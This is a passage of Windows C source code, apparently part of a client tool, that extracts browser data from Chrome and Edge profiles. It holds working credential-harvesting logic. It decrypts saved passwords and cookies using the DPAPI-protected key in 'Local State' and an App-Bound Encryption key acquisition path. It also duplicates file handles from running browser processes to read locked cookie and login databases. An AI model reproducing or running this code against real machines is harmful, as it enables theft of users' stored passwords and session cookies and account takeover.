        Status = IO_FindFile(Directory,
                             Buffer,
                             sizeof(Buffer),
                             FileIdExtdDirectoryInformation,
                             &Search,
                             TRUE,
                             &HasData);
    }
    NtClose(Directory);
    if (NT_SUCCESS(Status) && !HasData) return STATUS_OBJECT_NAME_NOT_FOUND;
    if (NT_SUCCESS(Status)) Id->FileId = Information->FileId;
    return Status;
}

static
NTSTATUS
ZpBrowser_MapDatabaseHandle(
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ PCWSTR DatabasePath,
    _Out_ PIO_FILE_MAP Map)
{
    PSYSTEM_PROCESS_INFORMATION Processes, Process;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION Handles;
    FILE_ID_INFORMATION Id, CandidateId;
    UNICODE_STRING ImageName;
    IO_STATUS_BLOCK IoStatus;
    HANDLE BrowserProcess, Candidate;
    ULONG_PTR Index;
    NTSTATUS Status;

    Status = ZpBrowser_QueryDatabaseId(DatabasePath, &Id);
    if (!NT_SUCCESS(Status)) return Status;
    RtlInitUnicodeString(&ImageName, Browser == ZpBrowserChrome ? L"chrome.exe" : L"msedge.exe");
    Status = Sys_QueryDynamicInfo(SystemProcessInformation, (PVOID*)&Processes);
    if (!NT_SUCCESS(Status)) return Status;
    Status = STATUS_OBJECT_NAME_NOT_FOUND;
    Process = Processes;
    for (;;)
    {
        if (RtlEqualUnicodeString(&Process->ImageName, &ImageName, TRUE) &&
            NT_SUCCESS(PS_OpenProcess(&BrowserProcess,
                                      PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
                                      (ULONG)(ULONG_PTR)Process->UniqueProcessId)))
        {
            if (NT_SUCCESS(ZpBrowser_QueryProcessHandles(BrowserProcess, &Handles)))
            {
                for (Index = 0; Index < Handles->NumberOfHandles; Index++)
                {
                    if (!NT_SUCCESS(NtDuplicateObject(BrowserProcess,
                                                      Handles->Handles[Index].HandleValue,
                                                      NtCurrentProcess(),
                                                      &Candidate,
                                                      FILE_READ_DATA | FILE_READ_ATTRIBUTES,
                                                      0,
                                                      0)))
                    {
                        continue;
                    }
                    if (GetFileType(Candidate) == FILE_TYPE_DISK &&
                        NT_SUCCESS(NtQueryInformationFile(Candidate,
                                                          &IoStatus,
                                                          &CandidateId,
                                                          sizeof(CandidateId),
                                                          FileIdInformation)) &&
                        RtlEqualMemory(&CandidateId, &Id, sizeof(Id)))
                    {
                        Status = IO_MapReadOnlyFile(Candidate, Map);
                        NtClose(Candidate);
                        break;
                    }
                    NtClose(Candidate);
                }
                Mem_Free(Handles);
            }
            NtClose(BrowserProcess);
            if (NT_SUCCESS(Status)) break;
        }
        if (Process->NextEntryOffset == 0) break;
        Process = Add2Ptr(Process, Process->NextEntryOffset);
    }
    Sys_FreeInfo(Processes);
    if (NT_SUCCESS(Status) && (ULONGLONG)Map->FileSize > (ULONGLONG)MAXLONGLONG)
    {
        IO_UnmapFile(Map);
        Status = STATUS_FILE_TOO_LARGE;
    }
    return Status;
}

static
PCWSTR
ZpBrowser_ColumnText(
    _In_ PZP_SQLITE Api,
    _In_ sqlite3_stmt* Statement,
    _In_ ULONG Column)
{
    PCWSTR Value = Api->ColumnText16(Statement, Column);

    return Value != NULL && Api->ColumnBytes16(Statement, Column) != 0 ? Value : L"";
}

static
NTSTATUS
ZpBrowser_ReadDocument(
    _In_ PCWSTR Path,
    _Outptr_result_z_ PWSTR* Text);

static
NTSTATUS
ZpBrowser_Utf8ToString(
    _In_reads_bytes_(Length) const BYTE* Value,
    _In_ ULONG Length,
    _Outptr_result_z_ PWSTR* Text)
{
    ULONG UnicodeBytes;
    NTSTATUS Status;

    Status = RtlUTF8ToUnicodeN(NULL, 0, &UnicodeBytes, (PCCH)Value, Length);
    if (!NT_SUCCESS(Status)) return Status;
    *Text = Mem_Alloc((SIZE_T)UnicodeBytes + sizeof(WCHAR));
    if (*Text == NULL) return STATUS_NO_MEMORY;
    Status = RtlUTF8ToUnicodeN(*Text, UnicodeBytes, &UnicodeBytes, (PCCH)Value, Length);
    if (NT_SUCCESS(Status)) (*Text)[UnicodeBytes / sizeof(WCHAR)] = UNICODE_NULL;
    else
    {
        Mem_Free(*Text);
        *Text = NULL;
    }
    return Status;
}

static
NTSTATUS
ZpBrowser_LoadCookieKey(
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ PCWSTR UserData,
    _Out_ PZP_BROWSER_COOKIE_KEY Key)
{
    DATA_BLOB Input, Output = { 0 };
    WCHAR Path[MAX_PATH];
    PWSTR Text, Marker, End;
    PBYTE Encoded;
    DWORD EncodedLength = 0;
    NTSTATUS Status;

    Key->Length = 0;
    Key->V20Length = 0;
    Key->V20Attempted = FALSE;
    Status = StringCchPrintfW(Path, ARRAYSIZE(Path), L"%s\\Local State", UserData);
    if (!NT_SUCCESS(Status)) return Status;
    Status = ZpBrowser_ReadDocument(Path, &Text);
    if (!NT_SUCCESS(Status)) return Status;
    Marker = wcsstr(Text, L"\"encrypted_key\"");
    if (Marker != NULL) Marker = wcschr(Marker + ARRAYSIZE(L"\"encrypted_key\"") - 1, L':');
    if (Marker != NULL) Marker = wcschr(Marker + 1, L'\"');
    End = Marker != NULL ? wcschr(++Marker, L'\"') : NULL;
    if (End == NULL)
    {
        Mem_Free(Text);
        return STATUS_NOT_FOUND;
    }
    if (!CryptStringToBinaryW(Marker,
                              (DWORD)(End - Marker),
                              CRYPT_STRING_BASE64,
                              NULL,
                              &EncodedLength,
                              NULL,
                              NULL))
    {
        Status = NTSTATUS_FROM_WIN32(GetLastError());
        Mem_Free(Text);
        return Status;
    }
    Encoded = Mem_Alloc(EncodedLength);
    if (Encoded == NULL)
    {
        Mem_Free(Text);
        return STATUS_NO_MEMORY;
    }
    if (!CryptStringToBinaryW(Marker,
                              (DWORD)(End - Marker),
                              CRYPT_STRING_BASE64,
                              Encoded,
                              &EncodedLength,
                              NULL,
                              NULL))
    {
        Status = NTSTATUS_FROM_WIN32(GetLastError());
    }
    else if (EncodedLength <= 5 || !RtlEqualMemory(Encoded, "DPAPI", 5))
    {
        Status = STATUS_NOT_SUPPORTED;
    }
    else
    {
        Input.pbData = Encoded + 5;
        Input.cbData = EncodedLength - 5;
        if (!CryptUnprotectData(&Input, NULL, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, &Output))
        {
            Status = NTSTATUS_FROM_WIN32(GetLastError());
        }
        else if (Output.cbData != sizeof(Key->Data))
        {
            Status = STATUS_DATA_ERROR;
        }
        else
        {
            RtlCopyMemory(Key->Data, Output.pbData, Output.cbData);
            Key->Length = Output.cbData;
            Status = STATUS_SUCCESS;
        }
    }
    if (Output.pbData != NULL)
    {
        RtlSecureZeroMemory(Output.pbData, Output.cbData);
        LocalFree(Output.pbData);
    }
    RtlSecureZeroMemory(Encoded, EncodedLength);
    Mem_Free(Encoded);
    Mem_Free(Text);
    return Status;
}

/* lazily fetch the App-Bound Encryption key on the first v20 record:
 * plain v10 (DPAPI) data must not pay for the ABE acquisition path */
static
VOID
ZpBrowser_LoadV20CookieKey(
    _In_ ZP_BROWSER_TYPE Browser,
    _Inout_ PZP_BROWSER_COOKIE_KEY Key,
    _In_reads_bytes_(Length) const BYTE* Encrypted,
    _In_ ULONG Length)
{
    if (Length < 3 || !RtlEqualMemory(Encrypted, "v20", 3) || Key->V20Attempted) return;
    Key->V20Attempted = TRUE;
    if (NT_SUCCESS(ZpAbeAcquireCookieKey(Browser == ZpBrowserChrome ? ZP_ABE_CHROME : ZP_ABE_EDGE,
                                         Key->V20Data,
                                         NULL)))
    {
        Key->V20Length = sizeof(Key->V20Data);
    }
}

static
NTSTATUS
ZpBrowser_CookieBytesToString(
    _In_ PCWSTR Host,
    _In_ ULONG SchemaVersion,
    _In_reads_bytes_(Length) const BYTE* Value,
    _In_ ULONG Length,
    _Outptr_result_z_ PWSTR* Text)
{
    BCRYPT_ALG_HANDLE Algorithm = NULL;
    BYTE Utf8Host[1024], Digest[32];
    ULONG Utf8Length;
    NTSTATUS Status;

    if (SchemaVersion < 24) return ZpBrowser_Utf8ToString(Value, Length, Text);
    if (Length < sizeof(Digest)) return STATUS_DATA_ERROR;
    Status = RtlUnicodeToUTF8N(NULL,
                              0,
                              &Utf8Length,
                              Host,
                              (ULONG)(wcslen(Host) * sizeof(WCHAR)));
    if (!NT_SUCCESS(Status)) return Status;
    if (Utf8Length > sizeof(Utf8Host)) return STATUS_NAME_TOO_LONG;
    Status = RtlUnicodeToUTF8N((PCHAR)Utf8Host,
                              sizeof(Utf8Host),
                              &Utf8Length,
                              Host,
                              (ULONG)(wcslen(Host) * sizeof(WCHAR)));
    if (NT_SUCCESS(Status))
        Status = BCryptOpenAlgorithmProvider(&Algorithm, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (NT_SUCCESS(Status))
        Status = BCryptHash(Algorithm,
                            NULL,
                            0,
                            Utf8Host,
                            Utf8Length,
                            Digest,
                            sizeof(Digest));
    if (NT_SUCCESS(Status) && !RtlEqualMemory(Digest, Value, sizeof(Digest))) Status = STATUS_DATA_ERROR;
    if (Algorithm != NULL) BCryptCloseAlgorithmProvider(Algorithm, 0);
    RtlSecureZeroMemory(Utf8Host, sizeof(Utf8Host));
    RtlSecureZeroMemory(Digest, sizeof(Digest));
    return NT_SUCCESS(Status) ?
               ZpBrowser_Utf8ToString(Value + sizeof(Digest), Length - sizeof(Digest), Text) : Status;
}

static
NTSTATUS
ZpBrowser_DecryptAesCookie(
    _In_reads_bytes_(32) const BYTE* Key,
    _In_reads_bytes_(Length) const BYTE* Value,
    _In_ ULONG Length,
    _In_ PCWSTR Host,
    _In_ ULONG SchemaVersion,
    _Outptr_result_z_ PWSTR* Text)
{
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO Authentication;
    BCRYPT_ALG_HANDLE Algorithm = NULL;
    BCRYPT_KEY_HANDLE Cipher = NULL;
    PBYTE KeyObject = NULL, Plaintext = NULL;
    ULONG KeyObjectLength, ResultLength, PlaintextLength = Length - 3 - 12 - 16;
    NTSTATUS Status;

    Status = BCryptOpenAlgorithmProvider(&Algorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (NT_SUCCESS(Status))
        Status = BCryptSetProperty(Algorithm,
                                   BCRYPT_CHAINING_MODE,
                                   (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                                   sizeof(BCRYPT_CHAIN_MODE_GCM),
                                   0);
    if (NT_SUCCESS(Status))
        Status = BCryptGetProperty(Algorithm,
                                   BCRYPT_OBJECT_LENGTH,
                                   (PUCHAR)&KeyObjectLength,
                                   sizeof(KeyObjectLength),
                                   &ResultLength,
                                   0);
    KeyObject = NT_SUCCESS(Status) ? Mem_Alloc(KeyObjectLength) : NULL;
    Plaintext = NT_SUCCESS(Status) ? Mem_Alloc(max(PlaintextLength, 1)) : NULL;
    if (NT_SUCCESS(Status) && (KeyObject == NULL || Plaintext == NULL)) Status = STATUS_NO_MEMORY;
    if (NT_SUCCESS(Status))
        Status = BCryptGenerateSymmetricKey(Algorithm,
                                            &Cipher,
                                            KeyObject,
                                            KeyObjectLength,
                                            (PUCHAR)Key,
                                            32,
                                            0);
    BCRYPT_INIT_AUTH_MODE_INFO(Authentication);
    Authentication.pbNonce = (PUCHAR)Value + 3;
    Authentication.cbNonce = 12;
    Authentication.pbTag = (PUCHAR)Value + Length - 16;
    Authentication.cbTag = 16;
    if (NT_SUCCESS(Status))
        Status = BCryptDecrypt(Cipher,
                               (PUCHAR)Value + 15,
                               PlaintextLength,
                               &Authentication,
                               NULL,
                               0,
                               Plaintext,
                               PlaintextLength,
                               &ResultLength,
                               0);
    if (NT_SUCCESS(Status))
        Status = ZpBrowser_CookieBytesToString(Host, SchemaVersion, Plaintext, ResultLength, Text);
    if (Cipher != NULL) BCryptDestroyKey(Cipher);
    if (Algorithm != NULL) BCryptCloseAlgorithmProvider(Algorithm, 0);
    if (Plaintext != NULL) RtlSecureZeroMemory(Plaintext, PlaintextLength);
    if (KeyObject != NULL) RtlSecureZeroMemory(KeyObject, KeyObjectLength);
    Mem_Free(Plaintext);
    Mem_Free(KeyObject);
    return Status;
}

static
NTSTATUS
ZpBrowser_DecryptCookie(
    _In_ PCZP_BROWSER_COOKIE_KEY Key,
    _In_reads_bytes_(Length) const BYTE* Value,
    _In_ ULONG Length,
    _In_ PCWSTR Host,
    _In_ ULONG SchemaVersion,
    _Outptr_result_z_ PWSTR* Text)
{
    DATA_BLOB Input, Output = { 0 };
    NTSTATUS Status;

    if (Length >= 3 &&
        (RtlEqualMemory(Value, "v10", 3) || RtlEqualMemory(Value, "v11", 3)))
    {
        return Length >= 31 && Key->Length != 0 ?
                   ZpBrowser_DecryptAesCookie(Key->Data, Value, Length, Host, SchemaVersion, Text) :
                   STATUS_NOT_SUPPORTED;
    }
    if (Length >= 3 && RtlEqualMemory(Value, "v20", 3))
    {
        return Length >= 31 && Key->V20Length != 0 ?
                   ZpBrowser_DecryptAesCookie(Key->V20Data, Value, Length, Host, SchemaVersion, Text) :
                   STATUS_NOT_SUPPORTED;
    }
    Input.pbData = (PBYTE)Value;
    Input.cbData = Length;
    if (!CryptUnprotectData(&Input, NULL, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, &Output))
    {
        return NTSTATUS_FROM_WIN32(GetLastError());
    }
    Status = ZpBrowser_CookieBytesToString(Host,
                                           SchemaVersion,
                                           Output.pbData,
                                           Output.cbData,
                                           Text);
    RtlSecureZeroMemory(Output.pbData, Output.cbData);
    LocalFree(Output.pbData);
    return Status;
}

static
ULONGLONG
ZpBrowser_ChromiumTime(
    _In_ sqlite3_int64 Value)
{
    return Value > 0 && (ULONGLONG)Value <= MAXULONGLONG / 10 ? (ULONGLONG)Value * 10 : 0;
}

static
NTSTATUS
ZpBrowser_AddSqliteRecord(
    _Inout_ PZP_BROWSER_BUILDER Builder,
    _In_ PZP_SQLITE Api,
    _In_ sqlite3_stmt* Statement,
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ ZP_BROWSER_KIND Kind,
    _Inout_ PZP_BROWSER_COOKIE_KEY CookieKey)
{
    PWSTR Decrypted = NULL;
    const BYTE* Encrypted;
    ULONG EncryptedLength;
    ULONG SchemaVersion;
    ULONGLONG Id = (ULONGLONG)Api->ColumnInt64(Statement, 0);
    ZP_BROWSER_RECORD_DATA Data;
    PCWSTR Identity, Name, Location, Detail;
    NTSTATUS Status;

    if (Kind == ZpBrowserKindHistory)
    {
        Identity = ZpBrowser_ColumnText(Api, Statement, 1);
        Name = ZpBrowser_ColumnText(Api, Statement, 2);
        Location = NULL;
        Detail = NULL;
        Data.History.LastVisitTime = ZpBrowser_ChromiumTime(Api->ColumnInt64(Statement, 3));
        Data.History.VisitCount = (ULONG)Api->ColumnInt(Statement, 4);
        Data.History.TypedCount = (ULONG)Api->ColumnInt(Statement, 5);
    }
    else if (Kind == ZpBrowserKindDownload)
    {
        Identity = ZpBrowser_ColumnText(Api, Statement, 1);
        Name = ZpBrowser_ColumnText(Api, Statement, 2);
        Location = NULL;
        Detail = NULL;
        Data.Download.StartTime = ZpBrowser_ChromiumTime(Api->ColumnInt64(Statement, 3));
        Data.Download.EndTime = ZpBrowser_ChromiumTime(Api->ColumnInt64(Statement, 4));
        Data.Download.ReceivedBytes = (ULONGLONG)Api->ColumnInt64(Statement, 5);
        Data.Download.TotalBytes = (ULONGLONG)Api->ColumnInt64(Statement, 6);
        Data.Download.State = (ULONG)Api->ColumnInt(Statement, 7);
        Data.Download.InterruptReason = (ULONG)Api->ColumnInt(Statement, 8);
    }
    else if (Kind == ZpBrowserKindPassword)
    {
        Identity = ZpBrowser_ColumnText(Api, Statement, 1);
        Name = ZpBrowser_ColumnText(Api, Statement, 2);
        Location = NULL;
        Detail = L"";
        Data.Password.CreationTime = ZpBrowser_ChromiumTime(Api->ColumnInt64(Statement, 4));
        Data.Password.Flags = 0;
        Encrypted = Api->ColumnBlob(Statement, 3);
        EncryptedLength = (ULONG)Api->ColumnBytes(Statement, 3);
        ZpBrowser_LoadV20CookieKey(Browser, CookieKey, Encrypted, EncryptedLength);
        if (Encrypted != NULL && EncryptedLength != 0)
        {
            /* passwords carry no domain-hash prefix: SchemaVersion 0 keeps the
               plaintext untouched by ZpBrowser_CookieBytesToString */
            if (NT_SUCCESS(ZpBrowser_DecryptCookie(CookieKey,
                                                   Encrypted,
                                                   EncryptedLength,
                                                   Identity,
                                                   0,
                                                   &Decrypted)))
            {
                Detail = Decrypted;
            }
            else
            {
                Data.Password.Flags |= ZP_BROWSER_FLAG_ENCRYPTED;
                if (EncryptedLength >= 3 && RtlEqualMemory(Encrypted, "v20", 3))
                    Data.Password.Flags |= ZP_BROWSER_FLAG_APP_BOUND;
            }
        }
    }
    else
    {
        Identity = ZpBrowser_ColumnText(Api, Statement, 1);
        Name = ZpBrowser_ColumnText(Api, Statement, 2);
        Location = ZpBrowser_ColumnText(Api, Statement, 3);
        Detail = ZpBrowser_ColumnText(Api, Statement, 10);
        Data.Cookie.CreationTime = ZpBrowser_ChromiumTime(Api->ColumnInt64(Statement, 4));
        Data.Cookie.ExpirationTime = ZpBrowser_ChromiumTime(Api->ColumnInt64(Statement, 5));
        Data.Cookie.LastAccessTime = ZpBrowser_ChromiumTime(Api->ColumnInt64(Statement, 6));
        Data.Cookie.SameSite = (ULONG)Api->ColumnInt(Statement, 9);
        Data.Cookie.Flags = (Api->ColumnInt(Statement, 7) ? ZP_BROWSER_FLAG_SECURE : 0UL) |
                            (Api->ColumnInt(Statement, 8) ? ZP_BROWSER_FLAG_HTTP_ONLY : 0UL);
        Encrypted = Api->ColumnBlob(Statement, 11);
        EncryptedLength = (ULONG)Api->ColumnBytes(Statement, 11);
        SchemaVersion = (ULONG)Api->ColumnInt(Statement, 12);
        ZpBrowser_LoadV20CookieKey(Browser, CookieKey, Encrypted, EncryptedLength);
        if (*Detail == UNICODE_NULL && Encrypted != NULL && EncryptedLength != 0)
        {
            if (NT_SUCCESS(ZpBrowser_DecryptCookie(CookieKey,
                                                   Encrypted,
                                                   EncryptedLength,
                                                   Identity,
                                                   SchemaVersion,
                                                   &Decrypted)))
            {
                Detail = Decrypted;
            }
            else
            {
                Data.Cookie.Flags |= ZP_BROWSER_FLAG_ENCRYPTED;
                if (EncryptedLength >= 3 && RtlEqualMemory(Encrypted, "v20", 3))
                    Data.Cookie.Flags |= ZP_BROWSER_FLAG_APP_BOUND;
            }
        }
    }
    Status = ZpBrowser_AddRecord(Builder,
                                 Kind,
                                 Browser,
                                 Id,
                                 &Data,
                                 Identity,
                                 Name,
                                 Location,
                                 Detail);
    if (Decrypted != NULL)
    {
        RtlSecureZeroMemory(Decrypted, wcslen(Decrypted) * sizeof(WCHAR));
        Mem_Free(Decrypted);
    }
    return Status;
}

static
ZP_STATUS
ZpBrowser_QueryDatabase(
    _In_ PCZP_BROWSER_QUERY_VIEW Query,
    _In_ PCWSTR UserData,
    _In_ PCWSTR DatabasePath,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    static const char HistorySql[] =
        "SELECT id,url,title,last_visit_time,visit_count,typed_count FROM urls "
        "WHERE (?1=0 OR id<?1) ORDER BY id DESC LIMIT ?2";
    static const char DownloadSql[] =
        "SELECT d.id,COALESCE((SELECT url FROM downloads_url_chains u WHERE u.id=d.id ORDER BY chain_index "
        "LIMIT 1),''),d.target_path,d.start_time,d.end_time,d.received_bytes,d.total_bytes,d.state,"
        "d.interrupt_reason FROM downloads d WHERE (?1=0 OR d.id<?1) ORDER BY d.id DESC LIMIT ?2";
    static const char CookieSql[] =
        "SELECT rowid,host_key,name,path,creation_utc,expires_utc,last_access_utc,is_secure,is_httponly,samesite,"
        "value,encrypted_value,(SELECT value FROM meta WHERE key='version') "
        "FROM cookies WHERE (?1=0 OR rowid<?1) ORDER BY rowid DESC LIMIT ?2";
    static const char PasswordSql[] =
        "SELECT rowid,origin_url,username_value,password_value,date_created "
        "FROM logins WHERE (?1=0 OR rowid<?1) ORDER BY rowid DESC LIMIT ?2";
    ZP_BROWSER_BUILDER Builder = { 0 };
    ZP_BROWSER_COOKIE_KEY CookieKey = { 0 };
    ZP_SQLITE Api;
    sqlite3* Database = NULL;
    sqlite3_stmt* Statement = NULL;
    IO_FILE_MAP Map;
    PCSTR Sql = Query->Kind == ZpBrowserKindHistory ? HistorySql :
                  Query->Kind == ZpBrowserKindDownload ? DownloadSql :
                  Query->Kind == ZpBrowserKindPassword ? PasswordSql : CookieSql;
    PSTR Utf8Path;
    ULONGLONG NextCursor = 0;
    NTSTATUS Status = STATUS_SUCCESS;
    NTSTATUS MapStatus = STATUS_NOT_FOUND;
    ZP_STATUS LoadStatus;
    int Result;

    LoadStatus = ZpBrowser_LoadSqlite(&Api);
    if (!ZpStatus_IsSuccess(LoadStatus)) return LoadStatus;
    Utf8Path = ZpBrowser_PathToUri(DatabasePath);
    if (Utf8Path == NULL)
    {
        FreeLibrary(Api.Module);
        return ZpStatus_FromNtStatus(STATUS_NO_MEMORY);
    }
    if (Query->Kind == ZpBrowserKindCookie || Query->Kind == ZpBrowserKindPassword)
    {
        ZpBrowser_LoadCookieKey(Query->Browser, UserData, &CookieKey);
    }
    Result = Api.OpenV2(Utf8Path,
                        &Database,
                        SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX | SQLITE_OPEN_URI,
                        NULL);
    Mem_Free(Utf8Path);
    if (Result == SQLITE_OK && Api.BusyTimeout != NULL)
    {
        /* plain shared-lock reads: wait out transient writer locks
         * instead of failing or bypassing locking entirely */
        Api.BusyTimeout(Database, 3000);
    }
    if (Result == SQLITE_CANTOPEN &&
        (Query->Kind == ZpBrowserKindCookie || Query->Kind == ZpBrowserKindPassword) &&
        Api.Deserialize != NULL)
    {
        if (Database != NULL)
        {
            Api.Close(Database);
            Database = NULL;
        }
        MapStatus = ZpBrowser_MapDatabaseHandle(Query->Browser, DatabasePath, &Map);
        if (NT_SUCCESS(MapStatus))
        {
            Result = Api.OpenV2(":memory:",
                                &Database,
                                SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE | SQLITE_OPEN_NOMUTEX,
                                NULL);
            if (Result == SQLITE_OK)
            {
                Result = Api.Deserialize(Database,
                                         "main",
                                         Map.BaseAddress,
                                         (sqlite3_int64)Map.FileSize,
                                         (sqlite3_int64)Map.FileSize,
                                         SQLITE_DESERIALIZE_READONLY);
            }
        }
    }
    if (Result == SQLITE_OK) Result = Api.PrepareV2(Database, Sql, -1, &Statement, NULL);
    if (Result == SQLITE_OK) Result = Api.BindInt64(Statement, 1, (sqlite3_int64)Query->Cursor);
    if (Result == SQLITE_OK) Result = Api.BindInt(Statement, 2, (int)Query->Limit);
    if (Result == SQLITE_OK)
    {
        while ((Result = Api.Step(Statement)) == SQLITE_ROW)
        {
            Status = ZpBrowser_AddSqliteRecord(&Builder,
                                               &Api,
                                               Statement,
                                               Query->Browser,
                                               Query->Kind,
                                               &CookieKey);
            if (!NT_SUCCESS(Status)) break;
            NextCursor = Builder.LastId;
        }
    }
    if (Result == SQLITE_DONE) Result = SQLITE_OK;
    if (Statement != NULL)
    {
        int FinalizeResult = Api.Finalize(Statement);

        if (Result == SQLITE_OK && FinalizeResult != SQLITE_OK) Result = FinalizeResult;
    }
    if (Database != NULL)
    {
        int CloseResult = Api.Close(Database);

        if (Result == SQLITE_OK && CloseResult != SQLITE_OK) Result = CloseResult;
    }
    if (NT_SUCCESS(MapStatus)) IO_UnmapFile(&Map);
    RtlSecureZeroMemory(&CookieKey, sizeof(CookieKey));
    FreeLibrary(Api.Module);
    if (!NT_SUCCESS(Status)) Result = SQLITE_OK;
    if (NT_SUCCESS(Status) && Result == SQLITE_OK)
    {
        if (Builder.Count < Query->Limit) NextCursor = 0;
        Status = ZpBrowser_EncodeBuilder(&Builder, NextCursor, Response, ResponseLength);
    }
    ZpBrowser_FreeBuilder(&Builder);
    return !NT_SUCCESS(Status) ? ZpStatus_FromNtStatus(Status) : ZpStatus_FromCode(ZpStatusSqlite, Result);
}

static
NTSTATUS
ZpBrowser_ReadDocument(
    _In_ PCWSTR Path,
    _Outptr_result_z_ PWSTR* Text)
{
    FILE_STANDARD_INFORMATION Information;
    UNICODE_STRING NtPath;
    IO_STATUS_BLOCK IoStatus;
    OBJECT_ATTRIBUTES Object;
    LARGE_INTEGER Offset = { 0 };
    PBYTE Bytes;
    PWSTR Value;
    HANDLE File;
    ULONG UnicodeBytes;
    NTSTATUS Status;

    Status = RtlDosPathNameToNtPathName_U_WithStatus(Path, &NtPath, NULL, NULL);
    if (!NT_SUCCESS(Status)) return Status;
    InitializeObjectAttributes(&Object, &NtPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    Status = NtOpenFile(&File,
                        FILE_READ_DATA | FILE_READ_ATTRIBUTES | SYNCHRONIZE,
                        &Object,
                        &IoStatus,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
    RtlFreeUnicodeString(&NtPath);
    if (!NT_SUCCESS(Status)) return Status;
    Status = NtQueryInformationFile(File,
                                    &IoStatus,
                                    &Information,
                                    sizeof(Information),
                                    FileStandardInformation);
    if (NT_SUCCESS(Status) && Information.EndOfFile.QuadPart > ZP_BROWSER_DOCUMENT_MAX_SIZE)
    {
        Status = STATUS_FILE_TOO_LARGE;
    }
    Bytes = NT_SUCCESS(Status) ? Mem_Alloc((SIZE_T)Information.EndOfFile.QuadPart) : NULL;
    if (NT_SUCCESS(Status) && Bytes == NULL) Status = STATUS_NO_MEMORY;
    if (NT_SUCCESS(Status))
    {
        Status = IO_ReadFile(File,
                             &Offset,
                             Bytes,
                             (ULONG)Information.EndOfFile.QuadPart,
                             NULL);
    }
    NtClose(File);
    if (!NT_SUCCESS(Status))
    {
        Mem_Free(Bytes);
        return Status;
    }
    Status = RtlUTF8ToUnicodeN(NULL,
                               0,
                               &UnicodeBytes,
                               (PCCH)Bytes,
                               (ULONG)Information.EndOfFile.QuadPart);
    if (Status != STATUS_BUFFER_TOO_SMALL && !NT_SUCCESS(Status))
    {
        Mem_Free(Bytes);
        return Status;
    }
    Value = Mem_Alloc((SIZE_T)UnicodeBytes + sizeof(WCHAR));
    if (Value == NULL)
    {
        Mem_Free(Bytes);
        return STATUS_NO_MEMORY;
    }
    Status = RtlUTF8ToUnicodeN(Value,
                               UnicodeBytes,
                               &UnicodeBytes,
                               (PCCH)Bytes,
                               (ULONG)Information.EndOfFile.QuadPart);
    Mem_Free(Bytes);
    if (!NT_SUCCESS(Status))
    {
        Mem_Free(Value);
        return Status;
    }
    Value[UnicodeBytes / sizeof(WCHAR)] = UNICODE_NULL;
    *Text = Value;
    return STATUS_SUCCESS;
}

typedef struct _ZP_BROWSER_JSON_NODE
{
    ULONG FirstChild;
    ULONG NextSibling;
    ULONG NameOffset;
    ULONG NameLength;
    ULONG ValueOffset;
    ULONG ValueLength;
    ZP_BROWSER_DOCUMENT_TYPE Type;
} ZP_BROWSER_JSON_NODE, *PZP_BROWSER_JSON_NODE;

typedef struct _ZP_BROWSER_DOCUMENT_SNAPSHOT
{
    ZP_CLIENT_SNAPSHOT Header;
    PWSTR Text;
    PZP_BROWSER_JSON_NODE Nodes;
    ULONG TextLength;
    ULONG NodeCount;
    ULONG NodeCapacity;
} ZP_BROWSER_DOCUMENT_SNAPSHOT, *PZP_BROWSER_DOCUMENT_SNAPSHOT;

typedef struct _ZP_BROWSER_JSON_PARSER
{
    PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot;
    ULONG Position;
} ZP_BROWSER_JSON_PARSER, *PZP_BROWSER_JSON_PARSER;

static
VOID
NTAPI
ZpBrowser_DeleteDocumentSnapshot(
    _In_ PZP_CLIENT_SNAPSHOT Header)
{
    PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot = CONTAINING_RECORD(Header,
                                                                ZP_BROWSER_DOCUMENT_SNAPSHOT,
                                                                Header);

    Mem_Free(Snapshot->Nodes);
    Mem_Free(Snapshot->Text);
    Mem_Free(Snapshot);
}

static
VOID
ZpBrowser_JsonSkipWhitespace(
    _Inout_ PZP_BROWSER_JSON_PARSER Parser)
{
    while (Parser->Position < Parser->Snapshot->TextLength)
    {
        WCHAR Character = Parser->Snapshot->Text[Parser->Position];

        if (Character != L' ' && Character != L'\t' && Character != L'\r' && Character != L'\n') break;
        Parser->Position++;
    }
}

static
LOGICAL
ZpBrowser_JsonIsHex(
    _In_ WCHAR Character)
{
    return (Character >= L'0' && Character <= L'9') ||
           (Character >= L'a' && Character <= L'f') ||
           (Character >= L'A' && Character <= L'F');
}

static
NTSTATUS
ZpBrowser_JsonReadString(
    _Inout_ PZP_BROWSER_JSON_PARSER Parser,
    _Out_ PULONG Offset,
    _Out_ PULONG Length)
{
    ULONG Start = Parser->Position, Index;

    if (Start >= Parser->Snapshot->TextLength || Parser->Snapshot->Text[Start] != L'"')
    {
        return STATUS_DATA_ERROR;
    }
    Parser->Position++;
    while (Parser->Position < Parser->Snapshot->TextLength)
    {
        WCHAR Character = Parser->Snapshot->Text[Parser->Position++];

        if (Character == L'"')
        {
            *Offset = Start;
            *Length = Parser->Position - Start;
            return STATUS_SUCCESS;
        }
        if (Character < 0x20) return STATUS_DATA_ERROR;
        if (Character != L'\\') continue;
        if (Parser->Position == Parser->Snapshot->TextLength) return STATUS_DATA_ERROR;
        Character = Parser->Snapshot->Text[Parser->Position++];
        if (Character == L'u')
        {
            if (Parser->Snapshot->TextLength - Parser->Position < 4) return STATUS_DATA_ERROR;
            for (Index = 0; Index < 4; Index++)
            {
                if (!ZpBrowser_JsonIsHex(Parser->Snapshot->Text[Parser->Position++]))
                {
